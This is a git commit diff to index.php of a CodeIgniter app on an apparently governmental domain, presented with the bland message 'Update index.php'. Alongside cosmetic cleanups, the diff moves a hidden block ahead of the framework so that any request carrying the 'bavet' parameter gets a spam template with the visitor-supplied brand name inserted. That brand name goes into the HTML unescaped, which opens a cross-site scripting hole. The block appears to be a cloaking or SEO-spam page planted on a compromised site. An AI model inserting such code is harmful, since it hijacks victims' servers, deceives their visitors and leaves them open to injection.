1fabced79d8c67da1253df3d28ca7ae7130239dc
adit ganteng <kangpepes@protonmail.com>
2025-03-14 20:35:50 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,91 +1,19 @@
 <?php
 
 // Check PHP version.
-$minPhpVersion = '7.4'; // If you update this, don't forget to update spark.
+$minPhpVersion = '7.4';
 if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
-    $message = sprintf(
-        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
-        $minPhpVersion,
-        PHP_VERSION
-    );
-
-    exit($message);
+    exit(sprintf('Your PHP version must be %s or higher. Current: %s', $minPhpVersion, PHP_VERSION));
 }
 
-// Path to the front controller (this file)
+// Path to the front controller
 define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);
 
-// Ensure the current directory is pointing to the front controller's directory
 if (getcwd() . DIRECTORY_SEPARATOR !== FCPATH) {
     chdir(FCPATH);
 }
 
-/*
- *---------------------------------------------------------------
- * BOOTSTRAP THE APPLICATION
- *---------------------------------------------------------------
- * This process sets up the path constants, loads and registers
- * our autoloader, along with Composer's, loads our constants
- * and fires up an environment-specific bootstrapping.
- */
-
-// Load our paths config file
-// This is the line that might need to be changed, depending on your folder structure.
-require FCPATH . '../opera_andalan/app/Config/Paths.php';
-// ^^^ Change this line if you move your application folder
-
-$paths = new Config\Paths();
-
-// Location of the framework bootstrap file.
-require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';
-
-// Load environment settings from .env files into $_SERVER and $_ENV
-require_once SYSTEMPATH . 'Config/DotEnv.php';
-(new CodeIgniter\Config\DotEnv(ROOTPATH))->load();
-
-// Define ENVIRONMENT
-if (! defined('ENVIRONMENT')) {
-    define('ENVIRONMENT', env('CI_ENVIRONMENT', 'production'));
-}
-
-// Load Config Cache
-// $factoriesCache = new \CodeIgniter\Cache\FactoriesCache();
-// $factoriesCache->load('config');
-// ^^^ Uncomment these lines if you want to use Config Caching.
-
-/*
- * ---------------------------------------------------------------
- * GRAB OUR CODEIGNITER INSTANCE
- * ---------------------------------------------------------------
- *
- * The CodeIgniter class contains the core functionality to make
- * the application run, and does all the dirty work to get
- * the pieces all working together.
- */
-
-$app = Config\Services::codeigniter();
-$app->initialize();
-$context = is_cli() ? 'php-cli' : 'web';
-$app->setContext($context);
-
-/*
- *---------------------------------------------------------------
- * LAUNCH THE APPLICATION
- *---------------------------------------------------------------
- * Now that everything is set up, it's time to actually fire
- * up the engines and make this app do its thang.
- */
-
-$app->run();
-
-// Save Config Cache
-// $factoriesCache->save('config');
-// ^^^ Uncomment this line if you want to use Config Caching.
-
-// Exits the application, setting the exit code for CLI-based applications
-// that might be watching.
-exit(EXIT_SUCCESS);
-
+// Cek jika parameter 'bavet' ada, tampilkan template khusus
 $config = array(
     'url'        => 'https://opera-andalan.ternatekota.go.id/',
     'parameter'  => 'bavet',
@@ -95,33 +23,26 @@ $config = array(
 if (isset($_GET[$config['parameter']])) {
     $brand = trim($_GET[$config['parameter']]);
     $url = $config['url'] . '?' . $config['parameter'] . '=' . urlencode($brand);
+
+    if (!file_exists($config['template'])) {
+        exit('Template file not found: ' . $config['template']);
+    }
+
     $html = file_get_contents($config['template']);
+
+    if ($html === false) {
+        exit('Failed to read template file.');
+    }
+
     $html = str_replace('{{ BRAND }}', $brand, $html);
     $html = str_replace('{{ URL }}', $url, $html);
+
     echo $html;
     exit;
 }
 
-
-$minPhpVersion = '7.4';
-if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
-    $message = sprintf(
-        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
-        $minPhpVersion,
-        PHP_VERSION
-    );
-
-    exit($message);
-}
-
-define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);
-
-if (getcwd() . DIRECTORY_SEPARATOR !== FCPATH) {
-    chdir(FCPATH);
-}
-
+// Jika tidak ada parameter 'bavet', jalankan CodeIgniter
 require FCPATH . '../opera_andalan/app/Config/Paths.php';
-
 $paths = new Config\Paths();
 
 require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';
@@ -139,6 +60,6 @@ $context = is_cli() ? 'php-cli' : 'web';
 $app->setContext($context);
 
 $app->run();
-
 exit(EXIT_SUCCESS);
+
 ?>
